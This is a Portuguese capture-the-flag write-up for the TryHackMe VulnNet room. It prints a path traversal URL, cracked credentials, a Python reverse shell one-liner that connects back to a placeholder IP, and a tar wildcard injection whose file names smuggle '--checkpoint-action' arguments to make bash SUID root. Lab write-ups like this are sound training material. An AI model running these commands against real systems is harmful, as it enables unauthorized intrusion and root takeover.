#ctf
https://tryhackme.com/room/vulnnet1

## Recon

Rodando o NMAP temos:

```
PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu  
80/tcp open  http    Apache httpd 2.4.29 Ubuntu 
```

Usando o scan o **ZAP** foi encontrado um falha "Path Transversal" que pode ser explorada através do caminho `http://vulnnet.thm/index.php?referer=/etc/passwd`

Usando **Burpsuite** para realizar um *bruteforce* de diretórios nesse endpoint achei no diretório `/etc/apache2/.htpasswd` as credenciais:

`developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0`

Crackeando com john através do comando abaixo encontrei a senha: **9972761drmfsls**

```sh
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Em background deixei um um fuzz de subdomínios rodando com comando abaixo e encontrei o subdomínio **broadcast**

```sh
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://vulnnet.thm -H "HOST: FUZZ.vulnnet.thm"
```

Ao entrar nesse subdomínio, é preciso de logar e com essas creds acima foi possível fazer isso.

Neste subdomínio, o site é uma ferramenta de compartilhamento de vídeos e a sua versão é 4.0. Pesquisando vulnerabilidades dessa versão achei uma [repositório](https://github.com/abeljm/Exploit-ClipBucket-4-File-Upload) que faz upload de um arquivo .php que permite execução de código remoto. Usando python para reverse shell foi possível ter acesso à máquina com usuário www-data.

```sh
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

## Privesc

Enumerando com [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration), achei um arquivo de backup com permissão de leitura no  caminho `/var/backups/ssh-backup.tar.gz`. Este arquivo contém a chave privada do do usuário *server-management*. Usando *ssh2john* e *john* obtive a passphrase deste usuário: **oneTWO3gOyac**.

```sh
ssh2john id_rsa > pass
john --wordlist=/usr/share/wordlists/rockyou.txt pass
```

Rodando um `cat /etc/crontab` existe um arquivo `/var/opt/backupsrv.sh` que faz backup de todos arquivos no diretório `/home/server-management/Documents` (que o usuário server-management tem permissão de escrita) e compacta para **tar**. Isso significa que é possível inserir três comandos para ganhar o root.

```sh
echo "chmod 4755 /bin/bash" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > "--checkpoint=1"
```

O script criado fará com que o bash tenha um bit SUID que pode ser executado com parâmetro -p para ganhar acesso ao root. Os outros dois comandos criam arquivos vazios que vai ser interpretados pelo **tar** como argumentos. Quando **tar** executar o argumento `--checkpoint=1`ele vai procurar todas as ações à serem tomadas (neste caso, executar o shell.sh).

Só esperar 2min (tempo da crontab rodar) e executar `bash -p` e GG.